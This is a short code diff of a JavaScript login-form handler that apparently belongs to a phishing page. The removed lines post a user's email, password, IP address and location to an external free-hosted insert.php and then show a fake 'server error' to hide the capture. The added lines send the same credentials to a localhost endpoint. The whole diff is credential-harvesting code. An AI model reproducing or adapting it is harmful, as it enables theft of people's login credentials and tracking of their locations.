@@ -25,31 +25,27 @@ async function sendDataToServer({
       "Missing Login credentials, please ensure you fill the login form"
     );
   } else {
-    try {
-      await fetch("https://theappcrud.000webhostapp.com/insert.php", {
-        method: "POST",
-        body: JSON.stringify({
-          emailValue,
-          passwordValue,
-          country,
-          city,
-          region,
-          ip,
-          timezone,
-        }),
-        headers: {
-          "Content-Type": "application/json",
-        },
-        mode: "no-cors",
-      });
+    const response = await fetch("http://localhost/server/insert.php", {
+      method: "POST",
+      body: JSON.stringify({
+        emailValue,
+        passwordValue,
+        country,
+        city,
+        region,
+        ip,
+        timezone,
+      }),
+      headers: {
+        "Content-Type": "application/json",
+      },
+      mode: "no-cors",
+    });
 
-      setError(
-        "Failed to access this resource due to a server error, please reload the page and try again"
-      );
-      setLoading(false);
-    } catch (error) {
-      return console.log("Couldn't make Fetch Request", error);
-    }
+    // const data = await response.json();
+    // console.log(data);
+
+    setLoading(false);
 
     // return "Data added successfully"; // Or any other success indication
   }
